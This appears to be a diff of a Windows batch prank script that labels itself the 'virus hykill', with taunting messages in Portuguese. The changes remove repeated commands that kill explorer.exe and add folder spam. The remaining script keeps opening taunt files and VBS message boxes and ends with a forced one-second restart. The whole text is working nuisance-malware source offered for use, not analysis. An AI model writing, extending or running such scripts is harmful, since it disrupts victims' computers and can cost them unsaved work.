@@ -1,20 +1,4 @@
 @echo off
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
-taskkill -f /im explorer.exe
 echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
 Start hahahahahahahahahahahah.txt
 echo "MsgBox Hykill matou seu pc",16,"ahahahhahahahhahahahah" > hahahahahahahhahah.vbs 
@@ -49,6 +33,13 @@ md your pc is fucked
 md seu pc foi fodido
 md your pc is fucked
 md seu pc foi fodido
+md hykill
+md hahahahhaha
+md Otario
+md eduardozinyt
+md kkkkk
+md kkkk
+md otariooooo
 echo MsgBox "Hykill matou seu pc",16,"HAHAHAHAHAHHAHAHAH" > Hykill.vbs
 Start Hykill.vbs
 Start Hykill.vbs
@@ -231,5 +222,8 @@ echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
 Start hahahahahahahahahahahah.txt
 echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
 Start hahahahahahahahahahahah.txt
+md tchau...
+md tchau..
+md tchau.
 msg * Tchau...
 shutdown -r -t 1 -c "Hykill MATOU SEU PC"
